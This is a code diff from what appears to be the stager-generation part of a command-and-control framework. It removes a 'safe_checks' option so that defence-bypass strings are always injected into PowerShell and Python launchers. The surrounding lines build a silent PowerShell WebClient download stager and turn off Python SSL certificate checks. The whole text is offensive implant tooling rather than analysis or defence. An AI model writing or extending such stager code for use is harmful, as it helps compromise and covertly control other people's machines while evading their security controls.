@@ -156,7 +156,6 @@ class Listener:
         proxy_creds="default",
         stager_retries="0",
         language=None,
-        safe_checks="",
         listener_name=None,
         bypasses: list[str] | None = None,
     ):
@@ -181,12 +180,9 @@ class Listener:
 
         if language == "powershell":
             stager = '$ErrorActionPreference = "SilentlyContinue";'
-            if safe_checks.lower() == "true":
-                stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
-                for bypass in bypasses:
-                    stager += bypass
-                stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"
+            for bypass in bypasses:
+                stager += bypass
 
             stager += "$wc=New-Object System.Net.WebClient;"
 
@@ -273,12 +269,8 @@ class Listener:
                 # monkey patch ssl woohooo
                 launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
-            try:
-                if safe_checks.lower() == "true":
-                    launcherBase += listener_util.python_safe_checks()
-            except Exception as e:
-                p = f"{listener_name}: Error setting LittleSnitch in stager: {e!s}"
-                log.error(p, exc_info=True)
+            for bypass in bypasses:
+                launcherBase += bypass
 
             if user_agent.lower() == "default":
                 profile = self.options["DefaultProfile"]["Value"]
